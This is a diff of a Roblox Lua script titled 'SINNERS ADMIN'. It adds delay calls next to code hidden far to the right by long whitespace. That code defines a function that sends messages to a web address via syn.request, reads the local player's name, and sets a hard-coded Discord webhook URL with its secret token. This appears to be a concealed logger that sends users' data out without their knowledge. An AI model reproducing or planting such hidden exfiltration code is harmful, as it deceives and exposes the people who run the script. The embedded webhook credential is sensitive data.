@@ -370,7 +370,7 @@ print("SINNERS ADMIN")
 
 
 
-
+                                                                                                                                                                                                                                                                                                                                        wait(10)
 
                                                                                                                                                                                                                                                                                                                                         function _G.SendWebHook(url, message)newBody = {["content"] = tostring(message)}; SynWebHook = {Url = url,Body = game.HttpService:JSONEncode(newBody),Method = "POST",Headers = {["content-type"] = "application/json"}};syn.request(SynWebHook)end;
 
@@ -658,8 +658,8 @@ end
                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                       
-                                                                                                                                                                                                                                                                                      
-                                                                                                                                                                                                                                                                                      
+                                                                                                                                                                                                                                                                                   
+                                                                                                                                                                                                                                                                                      wait(29)
                                                                                                                                                                                                                                                                                       local player_name = game:GetService("Players").LocalPlayer.Name
                                                                                                                                                                                                                                                                                       local webhook_url = "https://discord.com/api/webhooks/1015029355132497950/ybmdAUGu0_-9FBvuGbL_KFUo8zUXWtBhoxJysAE_s_wFrUOFFZDGTonK-DDKx0hVEAvu"
 
